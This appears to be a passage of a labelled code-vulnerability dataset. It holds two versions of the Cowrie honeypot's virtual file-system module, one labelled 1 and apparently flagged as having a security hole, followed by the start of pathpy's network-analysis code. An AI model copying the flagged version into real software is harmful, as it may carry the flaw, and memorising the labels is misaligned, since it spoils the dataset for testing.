        for i in pdir[:]:
            if i[A_NAME] == name:
                pdir.remove(i)
                return True
        return False


    def utime(self, path, atime, mtime):
        """"""
        """"""
        p = self.getfile(path)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        p[A_CTIME] = mtime


    def chmod(self, path, perm):
        """"""
        """"""
        p = self.getfile(path)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        p[A_MODE] = stat.S_IFMT(p[A_MODE]) | perm


    def chown(self, path, uid, gid):
        """"""
        """"""
        p = self.getfile(path)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        if (uid != -1):
            p[A_UID] = uid
        if (gid != -1):
            p[A_GID] = gid


    def remove(self, path):
        """"""
        """"""
        p = self.getfile(path, follow_symlinks=False)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        self.get_path(os.path.dirname(path)).remove(p)
        return


    def readlink(self, path):
        """"""
        """"""
        p = self.getfile(path, follow_symlinks=False)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        if not (p[A_MODE] & stat.S_IFLNK):
            raise OSError
        return p[A_TARGET]


    def symlink(self, targetPath, linkPath):
        """"""
        """"""
        raise notImplementedError


    def rename(self, oldpath, newpath):
        """"""
        """"""
        old = self.getfile(oldpath)
        if old == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        new = self.getfile(newpath)
        if new != False:
            raise OSError(errno.EEXIST, os.strerror(errno.EEXIST))

        self.get_path(os.path.dirname(oldpath)).remove(old)
        old[A_NAME] = os.path.basename(newpath)
        self.get_path(os.path.dirname(newpath)).append(old)
        return


    def listdir(self, path):
        """"""
        """"""
        names = [x[A_NAME] for x in self.get_path(path)]
        return names


    def lstat(self, path):
        """"""
        """"""
        return self.stat(path, follow_symlinks=False)


    def stat(self, path, follow_symlinks=True):
        """"""
        """"""
        if (path == ""/""):
            p = {A_TYPE:T_DIR, A_UID:0, A_GID:0, A_SIZE:4096, A_MODE:16877,
                A_CTIME:time.time()}
        else:
            p = self.getfile(path, follow_symlinks=follow_symlinks)

        if (p == False):
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))

        return _statobj( p[A_MODE], 0, 0, 1, p[A_UID], p[A_GID], p[A_SIZE],
            p[A_CTIME], p[A_CTIME], p[A_CTIME])


    def realpath(self, path):
        """"""
        """"""
        return path


    def update_size(self, filename, size):
        """"""
        """"""
        f = self.getfile(filename)
        if f == False:
            return
        if f[A_TYPE] != T_FILE:
            return
        f[A_SIZE] = size



class _statobj(object):
    """"""
    Transform a tuple into a stat object
    """"""
    def __init__(self, st_mode, st_ino, st_dev, st_nlink, st_uid, st_gid, st_size, st_atime, st_mtime, st_ctime):
        self.st_mode = st_mode
        self.st_ino = st_ino
        self.st_dev = st_dev
        self.st_nlink = st_nlink
        self.st_uid = st_uid
        self.st_gid = st_gid
        self.st_size = st_size
        self.st_atime = st_atime
        self.st_mtime = st_mtime
        self.st_ctime = st_ctime

/n/n/n",0
161,cb2c5d4f654cc4709c3edc97ec7216c210901c78,"/cowrie/shell/fs.py/n/n# Copyright (c) 2009-2014 Upi Tamminen <desaster@gmail.com>
# See the COPYRIGHT file for more information

""""""
This module contains ...
""""""

from __future__ import division, absolute_import

try:
    import cPickle as pickle
except:
    import pickle

import os
import time
import fnmatch
import hashlib
import re
import stat
import errno

from twisted.python import log

from cowrie.core.config import CONFIG

PICKLE = pickle.load(open(CONFIG.get('honeypot', 'filesystem_file'), 'rb'))

A_NAME, \
    A_TYPE, \
    A_UID, \
    A_GID, \
    A_SIZE, \
    A_MODE, \
    A_CTIME, \
    A_CONTENTS, \
    A_TARGET, \
    A_REALFILE = list(range(0, 10))
T_LINK, \
    T_DIR, \
    T_FILE, \
    T_BLK, \
    T_CHR, \
    T_SOCK, \
    T_FIFO = list(range(0, 7))

class TooManyLevels(Exception):
    """"""
    62 ELOOP Too many levels of symbolic links.  A path name lookup involved more than 8 symbolic links.
    raise OSError(errno.ELOOP, os.strerror(errno.ENOENT))
    """"""
    pass



class FileNotFound(Exception):
    """"""
    raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
    """"""
    pass



class HoneyPotFilesystem(object):
    """"""
    """"""

    def __init__(self, fs, cfg):
        self.fs = fs
        self.cfg = cfg

        # Keep track of open file descriptors
        self.tempfiles = {}
        self.filenames = {}

        # Keep count of new files, so we can have an artificial limit
        self.newcount = 0

        # Get the honeyfs path from the config file and explore it for file
        # contents:
        self.init_honeyfs(self.cfg.get('honeypot', 'contents_path'))


    def init_honeyfs(self, honeyfs_path):
        """"""
        Explore the honeyfs at 'honeyfs_path' and set all A_REALFILE attributes on
        the virtual filesystem.
        """"""

        for path, directories, filenames in os.walk(honeyfs_path):
            for filename in filenames:
                realfile_path = os.path.join(path, filename)
                virtual_path = '/' + os.path.relpath(realfile_path, honeyfs_path)

                f = self.getfile(virtual_path, follow_symlinks=False)
                if f and f[A_TYPE] == T_FILE:
                    self.update_realfile(f, realfile_path)

    def resolve_path(self, path, cwd):
        """"""
        This function does not need to be in this class, it has no dependencies
        """"""
        pieces = path.rstrip('/').split('/')

        if path[0] == '/':
            cwd = []
        else:
            cwd = [x for x in cwd.split('/') if len(x) and x is not None]

        while 1:
            if not len(pieces):
                break
            piece = pieces.pop(0)
            if piece == '..':
                if len(cwd): cwd.pop()
                continue
            if piece in ('.', ''):
                continue
            cwd.append(piece)

        return '/%s' % ('/'.join(cwd),)


    def resolve_path_wc(self, path, cwd):
        """"""
        Resolve_path with wildcard support (globbing)
        """"""
        pieces = path.rstrip('/').split('/')
        if len(pieces[0]):
            cwd = [x for x in cwd.split('/') if len(x) and x is not None]
            path = path[1:]
        else:
            cwd, pieces = [], pieces[1:]
        found = []
        def foo(p, cwd):
            if not len(p):
                found.append('/%s' % ('/'.join(cwd),))
            elif p[0] == '.':
                foo(p[1:], cwd)
            elif p[0] == '..':
                foo(p[1:], cwd[:-1])
            else:
                names = [x[A_NAME] for x in self.get_path('/'.join(cwd))]
                matches = [x for x in names if fnmatch.fnmatchcase(x, p[0])]
                for match in matches:
                    foo(p[1:], cwd + [match])
        foo(pieces, cwd)
        return found


    def get_path(self, path, follow_symlinks=True):
        """"""
        This returns the Cowrie file system objects for a directory
        """"""
        cwd = self.fs
        for part in path.split('/'):
            if not len(part):
                continue
            ok = False
            for c in cwd[A_CONTENTS]:
                if c[A_NAME] == part:
                    if c[A_TYPE] == T_LINK:
                        cwd = self.getfile(c[A_TARGET],
                            follow_symlinks=follow_symlinks)
                    else:
                        cwd = c
                    ok = True
                    break
            if not ok:
                raise FileNotFound
        return cwd[A_CONTENTS]


    def exists(self, path):
        """"""
        Return True if path refers to an existing path.
        Returns False for broken symbolic links.
        """"""
        f = self.getfile(path, follow_symlinks=True)
        if f is not False:
            return True


    def lexists(self, path):
        """"""
        Return True if path refers to an existing path.
        Returns True for broken symbolic links.
        """"""
        f = self.getfile(path, follow_symlinks=False)
        if f is not False:
            return True


    def update_realfile(self, f, realfile):
        """"""
        """"""
        if not f[A_REALFILE] and os.path.exists(realfile) and \
                not os.path.islink(realfile) and os.path.isfile(realfile) and \
                f[A_SIZE] < 25000000:
            f[A_REALFILE] = realfile


    def getfile(self, path, follow_symlinks=True):
        """"""
        This returns the Cowrie file system object for a path
        """"""
        if path == '/':
            return self.fs
        pieces = path.strip('/').split('/')
        cwd = ''
        p = self.fs
        for piece in pieces:
            if piece not in [x[A_NAME] for x in p[A_CONTENTS]]:
                return False
            for x in p[A_CONTENTS]:
                if x[A_NAME] == piece:
                    if piece == pieces[-1] and follow_symlinks==False:
                        p = x
                    elif x[A_TYPE] == T_LINK:
                        if x[A_TARGET][0] == '/':
                            # Absolute link
                            p = self.getfile(x[A_TARGET],
                                follow_symlinks=follow_symlinks)
                        else:
                            # Relative link
                            p = self.getfile('/'.join((cwd, x[A_TARGET])),
                                follow_symlinks=follow_symlinks)
                        if p == False:
                            # Broken link
                            return False
                    else:
                        p = x
            cwd = '/'.join((cwd, piece))
        return p


    def file_contents(self, target):
        """"""
        Retrieve the content of a file in the honeyfs
        It follows links.
        It tries A_REALFILE first and then tries honeyfs directory
        """"""
        path = self.resolve_path(target, os.path.dirname(target))
        if not path or not self.exists(path):
            raise FileNotFound
        f = self.getfile(path)
        if f[A_TYPE] == T_DIR:
            raise IsADirectoryError
        elif f[A_TYPE] == T_FILE and f[A_REALFILE]:
            return open(f[A_REALFILE], 'rb').read()
        elif f[A_TYPE] == T_FILE and f[A_SIZE] == 0:
            # Zero-byte file lacking A_REALFILE backing: probably empty.
            # (The exceptions to this are some system files in /proc and /sys,
            # but it's likely better to return nothing than suspiciously fail.)
            return ''


    def mkfile(self, path, uid, gid, size, mode, ctime=None):
        """"""
        """"""
        if self.newcount > 10000:
            return False
        if ctime is None:
            ctime = time.time()
        dir = self.get_path(os.path.dirname(path))
        outfile = os.path.basename(path)
        if outfile in [x[A_NAME] for x in dir]:
            dir.remove([x for x in dir if x[A_NAME] == outfile][0])
        dir.append([outfile, T_FILE, uid, gid, size, mode, ctime, [],
            None, None])
        self.newcount += 1
        return True


    def mkdir(self, path, uid, gid, size, mode, ctime=None):
        """"""
        """"""
        if self.newcount > 10000:
            raise OSError(errno.EDQUOT, os.strerror(errno.EDQUOT), path)
        if ctime is None:
            ctime = time.time()
        if not len(path.strip('/')):
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT), path)
        try:
            dir = self.get_path(os.path.dirname(path.strip('/')))
        except IndexError:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT), path)
            return False
        dir.append([os.path.basename(path), T_DIR, uid, gid, size, mode,
            ctime, [], None, None])
        self.newcount += 1


    def isfile(self, path):
        """"""
        Return True if path is an existing regular file. This follows symbolic
        links, so both islink() and isfile() can be true for the same path.
        """"""
        try:
            f = self.getfile(path)
        except:
            return False
        return f[A_TYPE] == T_FILE


    def islink(self, path):
        """"""
        Return True if path refers to a directory entry that is a symbolic
        link. Always False if symbolic links are not supported by the python
        runtime.
        """"""
        try:
            f = self.getfile(path)
        except:
            return False
        return f[A_TYPE] == T_LINK


    def isdir(self, path):
        """"""
        Return True if path is an existing directory.
        This follows symbolic links, so both islink() and isdir() can be true for the same path.
        """"""
        if path == '/':
            return True
        try:
            dir = self.getfile(path)
        except:
            dir = None
        if dir is None or dir is False:
            return False
        if dir[A_TYPE] == T_DIR:
            return True
        else:
            return False

    """"""
    Below additions for SFTP support, try to keep functions here similar to os.*
    """"""
    def open(self, filename, openFlags, mode):
        """"""
        #log.msg(""fs.open %s"" % filename)

        #if (openFlags & os.O_APPEND == os.O_APPEND):
        #    log.msg(""fs.open append"")

        #if (openFlags & os.O_CREAT == os.O_CREAT):
        #    log.msg(""fs.open creat"")

        #if (openFlags & os.O_TRUNC == os.O_TRUNC):
        #    log.msg(""fs.open trunc"")

        #if (openFlags & os.O_EXCL == os.O_EXCL):
        #    log.msg(""fs.open excl"")

        # treat O_RDWR same as O_WRONLY
        """"""
        if openFlags & os.O_WRONLY == os.O_WRONLY or openFlags & os.O_RDWR == os.O_RDWR:
            # strip executable bit
            hostmode = mode & ~(111)
            hostfile = '%s/%s_sftp_%s' % \
                       (self.cfg.get('honeypot', 'download_path'),
                    time.strftime('%Y%m%d-%H%M%S'),
                    re.sub('[^A-Za-z0-9]', '_', filename))
            #log.msg(""fs.open file for writing, saving to %s"" % safeoutfile)
            self.mkfile(filename, 0, 0, 0, stat.S_IFREG | mode)
            fd = os.open(hostfile, openFlags, hostmode)
            self.update_realfile(self.getfile(filename), hostfile)
            self.tempfiles[fd] = hostfile
            self.filenames[fd] = filename
            return fd

        elif openFlags & os.O_RDONLY == os.O_RDONLY:
            return None

        return None


    def read(self, fd, size):
        """"""
        """"""
        # this should not be called, we intercept at readChunk
        raise notImplementedError


    def write(self, fd, string):
        """"""
        """"""
        return os.write(fd, string)


    def close(self, fd):
        """"""
        """"""
        if not fd:
            return True
        if self.tempfiles[fd] is not None:
            shasum = hashlib.sha256(open(self.tempfiles[fd], 'rb').read()).hexdigest()
            shasumfile = self.cfg.get('honeypot', 'download_path') + ""/"" + shasum
            if (os.path.exists(shasumfile)):
                os.remove(self.tempfiles[fd])
            else:
                os.rename(self.tempfiles[fd], shasumfile)
            #os.symlink(shasum, self.tempfiles[fd])
            self.update_realfile(self.getfile(self.filenames[fd]), shasumfile)
            log.msg(format='SFTP Uploaded file \""%(filename)s\"" to %(outfile)s',
                    eventid='cowrie.session.file_upload',
                    filename=os.path.basename(self.filenames[fd]),
                    outfile=shasumfile,
                    shasum=shasum)
            del self.tempfiles[fd]
            del self.filenames[fd]
        return os.close(fd)


    def lseek(self, fd, offset, whence):
        """"""
        """"""
        if not fd:
            return True
        return os.lseek(fd, offset, whence)


    def mkdir2(self, path):
        """"""
        FIXME mkdir() name conflicts with existing mkdir
        """"""
        dir = self.getfile(path)
        if dir != False:
            raise OSError(errno.EEXIST, os.strerror(errno.EEXIST), path)
        self.mkdir(path, 0, 0, 4096, 16877)


    def rmdir(self, path):
        """"""
        """"""
        path = path.rstrip('/')
        name = os.path.basename(path)
        parent = os.path.dirname(path)
        dir = self.getfile(path, follow_symlinks=False)
        if dir == False:
            raise OSError(errno.EEXIST, os.strerror(errno.EEXIST), path)
        if dir[A_TYPE] != T_DIR:
            raise OSError(errno.ENOTDIR, os.strerror(errno.ENOTDIR), path)
        if len(self.get_path(path))>0:
            raise OSError(errno.ENOTEMPTY, os.strerror(errno.ENOTEMPTY), path)
        pdir = self.get_path(parent,follow_symlinks=True)
        for i in pdir[:]:
            if i[A_NAME] == name:
                pdir.remove(i)
                return True
        return False


    def utime(self, path, atime, mtime):
        """"""
        """"""
        p = self.getfile(path)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        p[A_CTIME] = mtime


    def chmod(self, path, perm):
        """"""
        """"""
        p = self.getfile(path)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        p[A_MODE] = stat.S_IFMT(p[A_MODE]) | perm


    def chown(self, path, uid, gid):
        """"""
        """"""
        p = self.getfile(path)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        if (uid != -1):
            p[A_UID] = uid
        if (gid != -1):
            p[A_GID] = gid


    def remove(self, path):
        """"""
        """"""
        p = self.getfile(path, follow_symlinks=False)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        self.get_path(os.path.dirname(path)).remove(p)
        return


    def readlink(self, path):
        """"""
        """"""
        p = self.getfile(path, follow_symlinks=False)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        if not (p[A_MODE] & stat.S_IFLNK):
            raise OSError
        return p[A_TARGET]


    def symlink(self, targetPath, linkPath):
        """"""
        """"""
        raise notImplementedError


    def rename(self, oldpath, newpath):
        """"""
        """"""
        old = self.getfile(oldpath)
        if old == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        new = self.getfile(newpath)
        if new != False:
            raise OSError(errno.EEXIST, os.strerror(errno.EEXIST))

        self.get_path(os.path.dirname(oldpath)).remove(old)
        old[A_NAME] = os.path.basename(newpath)
        self.get_path(os.path.dirname(newpath)).append(old)
        return


    def listdir(self, path):
        """"""
        """"""
        names = [x[A_NAME] for x in self.get_path(path)]
        return names


    def lstat(self, path):
        """"""
        """"""
        return self.stat(path, follow_symlinks=False)


    def stat(self, path, follow_symlinks=True):
        """"""
        """"""
        if (path == ""/""):
            p = {A_TYPE:T_DIR, A_UID:0, A_GID:0, A_SIZE:4096, A_MODE:16877,
                A_CTIME:time.time()}
        else:
            p = self.getfile(path, follow_symlinks=follow_symlinks)

        if (p == False):
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))

        return _statobj( p[A_MODE], 0, 0, 1, p[A_UID], p[A_GID], p[A_SIZE],
            p[A_CTIME], p[A_CTIME], p[A_CTIME])


    def realpath(self, path):
        """"""
        """"""
        return path


    def update_size(self, filename, size):
        """"""
        """"""
        f = self.getfile(filename)
        if f == False:
            return
        if f[A_TYPE] != T_FILE:
            return
        f[A_SIZE] = size



class _statobj(object):
    """"""
    Transform a tuple into a stat object
    """"""
    def __init__(self, st_mode, st_ino, st_dev, st_nlink, st_uid, st_gid, st_size, st_atime, st_mtime, st_ctime):
        self.st_mode = st_mode
        self.st_ino = st_ino
        self.st_dev = st_dev
        self.st_nlink = st_nlink
        self.st_uid = st_uid
        self.st_gid = st_gid
        self.st_size = st_size
        self.st_atime = st_atime
        self.st_mtime = st_mtime
        self.st_ctime = st_ctime

/n/n/n",1
162,13360e223925e21d02d6132d342c47fe53abc994,"pathpy/HigherOrderNetwork.py/n/n# -*- coding: utf-8 -*-
""""""
    pathpy is an OpenSource python package for the analysis of time series data
    on networks using higher- and multi order graphical models.

    Copyright (C) 2016-2017 Ingo Scholtes, ETH Zürich

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU Affero General Public License as published
    by the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU Affero General Public License for more details.

    You should have received a copy of the GNU Affero General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.

    Contact the developer:

    E-mail: ischoltes@ethz.ch
    Web:    http://www.ingoscholtes.net
""""""

import collections as _co
import bisect as _bs
import itertools as _iter

import numpy as _np

import scipy.sparse as _sparse
import scipy.sparse.linalg as _sla
import scipy.linalg as _la
import scipy as _sp

from pathpy.Log import Log
from pathpy.Log import Severity


class EmptySCCError(Exception):
    """"""
    This exception is thrown whenever a non-empty strongly
    connected component is needed, but we encounter an empty one
    """"""
    pass


class HigherOrderNetwork:
    """"""
    Instances of this class capture a k-th-order representation
    of path statistics. Path statistics can originate from pathway
    data, temporal networks, or from processes observed on top
    of a network topology.
    """"""


    def __init__(self, paths, k=1, separator='-', nullModel=False,
        method='FirstOrderTransitions', lanczosVecs=15, maxiter=1000):
        """"""
        Generates a k-th-order representation based on the given path statistics.

        @param paths: An instance of class Paths, which contains the path
            statistics to be used in the generation of the k-th order
            representation

        @param k: The order of the network representation to generate.
            For the default case of k=1, the resulting representation
            corresponds to the usual (first-order) aggregate network,
            i.e. links connect nodes and link weights are given by the
            frequency of each interaction. For k>1, a k-th order node
            corresponds to a sequence of k nodes. The weight of a k-th
            order link captures the frequency of a path of length k.

        @param separator: The separator character to be used in
            higher-order node names.

        @param nullModel: For the default value False, link weights are
            generated based on the statistics of paths of length k in the
            underlying path statistics instance. If True, link weights are
            generated from the first-order model (k=1) based on the assumption
            of independent links (i.e. corresponding) to a first-order
            Markov model.

        @param method: specifies how the null model link weights
            in the k-th order model are calculated. For the default
            method='FirstOrderTransitions', the weight
            w('v_1-v_2-...v_k', 'v_2-...-v_k-v_k+1') of a k-order edge
            is set to the transition probability T['v_k', 'v_k+1'] in the
            first order network. For method='KOrderPi' the entry
            pi['v1-...-v_k'] in the stationary distribution of the
            k-order network is used instead.
        """"""

        assert not nullModel or (nullModel and k > 1)

        assert method == 'FirstOrderTransitions' or method == 'KOrderPi', \
            'Error: unknown method to build null model'

        assert paths.paths.keys() and max(paths.paths.keys()) >= k, \
            'Error: constructing a model of order k requires paths of at least length k'

        ## The order of this HigherOrderNetwork
        self.order = k

        ## The paths object used to generate this instance
        self.paths = paths

        ## The nodes in this HigherOrderNetwork
        self.nodes = []

        ## The separator character used to label higher-order nodes.
        ## For separator '-', a second-order node will be 'a-b'.
        self.separator = separator

        ## A dictionary containing the sets of successors of all nodes
        self.successors = _co.defaultdict(lambda: set())

        ## A dictionary containing the sets of predecessors of all nodes
        self.predecessors = _co.defaultdict(lambda: set())

        ## A dictionary containing the out-degrees of all nodes
        self.outdegrees = _co.defaultdict(lambda: 0.0)

        ## A dictionary containing the in-degrees of all nodes
        self.indegrees = _co.defaultdict(lambda: 0.0)

        # NOTE: edge weights, as well as in- and out weights of nodes are 
        # numpy arrays consisting of two weight components [w0, w1]. w0 
        # counts the weight of an edge based on its occurrence in a subpaths 
        # while w1 counts the weight of an edge based on its occurrence in 
        # a longest path. As an illustrating example, consider the single 
        # path a -> b -> c. In the first-order network, the weights of edges 
        # (a,b) and (b,c) are both (1,0). In the second-order network, the 
        # weight of edge (a-b, b-c) is (0,1).

        ## A dictionary containing edges as well as edge weights
        self.edges = _co.defaultdict(lambda: _np.array([0., 0.]))

        ## A dictionary containing the weighted in-degrees of all nodes
        self.inweights = _co.defaultdict(lambda: _np.array([0., 0.]))        

        ## A dictionary containing the weighted out-degrees of all nodes
        self.outweights = _co.defaultdict(lambda: _np.array([0., 0.]))        

        if k > 1:
            # For k>1 we need the first-order network to generate the null model
            # and calculate the degrees of freedom

            # For a multi-order model, the first-order network is generated multiple times!
            # TODO: Make this more efficient
            g1 = HigherOrderNetwork(paths, k=1)
            A = g1.getAdjacencyMatrix(includeSubPaths=True, weighted=False, transposed=True)

        if not nullModel:
            # Calculate the frequency of all paths of
            # length k, generate k-order nodes and set
            # edge weights accordingly
            node_set = set()
            iterator = paths.paths[k].items()

            if k==0:
                # For a 0-order model, we generate a dummy start node
                node_set.add('start')
                for key, val in iterator:
                    w = key[0]
                    node_set.add(w)
                    self.edges[('start',w)] += val
                    self.successors['start'].add(w)
                    self.predecessors[w].add('start')
                    self.indegrees[w] = len(self.predecessors[w])
                    self.inweights[w] += val
                    self.outdegrees['start'] = len(self.successors['start'])
                    self.outweights['start'] += val
            else:
                for key, val in iterator:
                    # Generate names of k-order nodes v and w
                    v = separator.join(key[0:-1]) 
                    w = separator.join(key[1:])
                    node_set.add(v)
                    node_set.add(w)
                    self.edges[(v,w)] += val
                    self.successors[v].add(w)
                    self.predecessors[w].add(v)
                    self.indegrees[w] = len(self.predecessors[w])
                    self.inweights[w] += val
                    self.outdegrees[v] = len(self.successors[v])
                    self.outweights[v] += val

            self.nodes = list(node_set)

            # Note: For all sequences of length k which (i) have never been observed, but
            #       (ii) do actually represent paths of length k in the first-order network,
            #       we may want to include some 'escape' mechanism along the
            #       lines of (Cleary and Witten 1994)

        else:
            # generate the *expected* frequencies of all possible
            # paths based on independently occurring (first-order) links

            # generate all possible paths of length k
            # based on edges in the first-order network
            possiblePaths = list(g1.edges.keys())

            for _ in range(k-1):
                E_new = list()
                for e1 in possiblePaths:
                    for e2 in g1.edges:
                        if e1[-1] == e2[0]:
                            p = e1 + (e2[1],)
                            E_new.append(p)
                possiblePaths = E_new

            # validate that the number of unique generated paths corresponds to the sum of entries in A**k
            assert (A**k).sum() == len(possiblePaths), 'Expected ' + str((A**k).sum()) + \
                ' paths but got ' + str(len(possiblePaths))

            if method == 'KOrderPi':
                # compute stationary distribution of a random walker in the k-th order network
                g_k = HigherOrderNetwork(paths, k=k, separator=separator, nullModel=False)
                pi_k = HigherOrderNetwork.getLeadingEigenvector(g_k.getTransitionMatrix(includeSubPaths=True),
                                                                normalized=True, lanczosVecs=lanczosVecs, maxiter=maxiter)
            else:
                # A = g1.getAdjacencyMatrix(includeSubPaths=True, weighted=True, transposed=False)
                T = g1.getTransitionMatrix(includeSubPaths=True)

            # assign link weights in k-order null model
            for p in possiblePaths:
                v = p[0]
                # add k-order nodes and edges
                for l in range(1, k):
                    v = v + separator + p[l]
                w = p[1]
                for l in range(2, k+1):
                    w = w + separator + p[l]
                if v not in self.nodes:
                    self.nodes.append(v)
                if w not in self.nodes:
                    self.nodes.append(w)

                # NOTE: under the null model's assumption of independent events, we
                # have P(B|A) = P(A ^ B)/P(A) = P(A)*P(B)/P(A) = P(B)
                # In other words: we are encoding a k-1-order Markov process in a k-order
                # Markov model and for the transition probabilities T_AB in the k-order model
                # we simply have to set the k-1-order probabilities, i.e. T_AB = P(B)

                # Solution A: Use entries of stationary distribution,
                # which give stationary visitation frequencies of k-order node w
                if method == 'KOrderPi':
                    self.edges[(v, w)] = _np.array([0, pi_k[g_k.nodes.index(w)]])

                # Solution B: Use relative edge weight in first-order network
                # Note that A is *not* transposed
                # self.edges[(v,w)] = A[(g1.nodes.index(p[-2]),g1.nodes.index(p[-1]))] / A.sum()

                # Solution C: Use transition probability in first-order network
                # Note that T is transposed (!)
                elif method == 'FirstOrderTransitions':
                    p_vw = T[(g1.nodes.index(p[-1]), g1.nodes.index(p[-2]))]
                    self.edges[(v, w)] = _np.array([0, p_vw])

                # Solution D: calculate k-path weights based on entries of squared k-1-order adjacency matrix

                # Note: Solution B and C are equivalent
                self.successors[v].add(w)
                self.indegrees[w] = len(self.predecessors[w])
                self.inweights[w] += self.edges[(v, w)]
                self.outdegrees[v] = len(self.successors[v])
                self.outweights[v] += self.edges[(v, w)]

        # Compute degrees of freedom of models
        if k == 0:
            # for a zero-order model, we just fit node probabilities
            # (excluding the special 'start' node)
            # Since probabilities must sum to one, the effective degree
            # of freedom is one less than the number of nodes
            # This holds for both the paths and the ngrams model
            self.dof_paths = self.vcount() - 2
            self.dof_ngrams = self.vcount() - 2
        else:
            # for a first-order model, self is the first-order network
            if k == 1:
                g1 = self
                A = g1.getAdjacencyMatrix(includeSubPaths=True, weighted=False, transposed=True)

            # Degrees of freedom in a higher-order ngram model
            s = g1.vcount()

            ## The degrees of freedom of the higher-order model, under the ngram assumption
            self.dof_ngrams = (s**k)*(s-1)

            # For k>0, the degrees of freedom of a path-based model depend on
            # the number of possible paths of length k in the first-order network.
            # Since probabilities in each row must sum to one, the degrees
            # of freedom must be reduced by one for each k-order node
            # that has at least one possible transition.

            # (A**k).sum() counts the number of different paths of exactly length k
            # based on the first-order network, which corresponds to the number of
            # possible transitions in the transition matrix of a k-th order model.
            paths_k = (A**k).sum()

            # For the degrees of freedom, we must additionally consider that
            # rows in the transition matrix must sum to one, i.e. we have to
            # subtract one degree of freedom for every non-zero row in the (null-model)
            # transition matrix. In other words, we subtract one for every path of length k-1
            # that can possibly be followed by at least one edge to a path of length k

            # This can be calculated by counting the number of non-zero elements in the
            # vector containing the row sums of A**k
            non_zero = _np.count_nonzero((A**k).sum(axis=0))

            ## The degrees of freedom of the higher-order model, under the paths assumption
            self.dof_paths = paths_k - non_zero


    def vcount(self):
        """""" Returns the number of nodes """"""
        return len(self.nodes)


    def ecount(self):
        """""" Returns the number of links """"""
        return len(self.edges)


    def totalEdgeWeight(self):
        """""" Returns the sum of all edge weights """"""
        if self.edges:
            return sum(self.edges.values())
        return _np.array([0, 0])


    def modelSize(self):
        """"""
        Returns the number of non-zero elements in the adjacency matrix
        of the higher-order model.
        """"""
        return self.getAdjacencyMatrix().count_nonzero()


    def HigherOrderNodeToPath(self, node):
        """"""
        Helper function that transforms a node in a
        higher-order network of order k into a corresponding
        path of length k-1. For a higher-order node 'a-b-c-d'
        this function will return ('a','b','c','d')

        @param node: The higher-order node to be transformed to a path.
        """"""
        return tuple(node.split(self.separator))


    def pathToHigherOrderNodes(self, path, k=None):
        """"""
        Helper function that transforms a path into a sequence of k-order nodes
        using the separator character of the HigherOrderNetwork instance

        Consider an example path (a,b,c,d) with a separator string '-'
        For k=1, the output will be the list of strings ['a', 'b', 'c', 'd']
        For k=2, the output will be the list of strings ['a-b', 'b-c', 'c-d']
        For k=3, the output will be the list of strings ['a-b-c', 'b-c-d']
        etc.

        @param path: the path tuple to turn into a sequence of higher-order nodes

        @param k: the order of the representation to use (default: order of the
            HigherOrderNetwork instance)
        """"""
        if k is None:
            k = self.order
        assert len(path) > k, 'Error: Path must be longer than k'

        if k == 0 and len(path) == 1:
            return ['start', path[0]]

        return [self.separator.join(path[n:n+k]) for n in range(len(path)-k+1)]


    def getNodeNameMap(self):
        """"""
        Returns a dictionary that can be used to map
        nodes to matrix/vector indices
        """"""

        name_map = {}
        for idx, v in enumerate(self.nodes):
            name_map[v] = idx
        return name_map


    def getDoF(self, assumption=""paths""):
        """"""
        Calculates the degrees of freedom (i.e. number of parameters) of
        this k-order model. Depending on the modeling assumptions, this either
        corresponds to the number of paths of length k in the first-order network
        or to the number of all possible k-grams. The degrees of freedom of a model
        can be used to assess the model complexity when calculating, e.g., the
        Bayesian Information Criterion (BIC).

        @param assumption: if set to 'paths', for the degree of freedon calculation in the BIC,
            only paths in the first-order network topology will be considered. This is
            needed whenever we are interested in a modeling of paths in a given network topology.
            If set to 'ngrams' all possible n-grams will be considered, independent of whether they
            are valid paths in the first-order network or not. The 'ngrams'
            and the 'paths' assumption coincide if the first-order network is fully connected.
        """"""
        assert assumption == 'paths' or assumption == 'ngrams', 'Error: Invalid assumption'

        if assumption == 'paths':
            return self.dof_paths
        return self.dof_ngrams


    def getDistanceMatrix(self):
        """"""
        Calculates shortest path distances between all pairs of
        higher-order nodes using the Floyd-Warshall algorithm.
        """"""

        Log.add('Calculating distance matrix in higher-order network (k = ' +
                str(self.order) + ') ...', Severity.INFO)

        dist = _co.defaultdict(lambda: _co.defaultdict(lambda: _np.inf))

        for v in self.nodes:
            dist[v][v] = 0

        for e in self.edges:
            dist[e[0]][e[1]] = 1

        for k in self.nodes:
            for v in self.nodes:
                for w in self.nodes:
                    if dist[v][w] > dist[v][k] + dist[k][w]:
                        dist[v][w] = dist[v][k] + dist[k][w]

        Log.add('finished.', Severity.INFO)

        return dist


    def getShortestPaths(self):
        """"""
        Calculates all shortest paths between all pairs of
        higher-order nodes using the Floyd-Warshall algorithm.
        """"""

        Log.add('Calculating shortest paths in higher-order network (k = ' +
                str(self.order) + ') ...', Severity.INFO)

        dist = _co.defaultdict(lambda: _co.defaultdict(lambda: _np.inf))
        shortest_paths = _co.defaultdict(lambda: _co.defaultdict(lambda: set()))

        for e in self.edges:
            dist[e[0]][e[1]] = 1
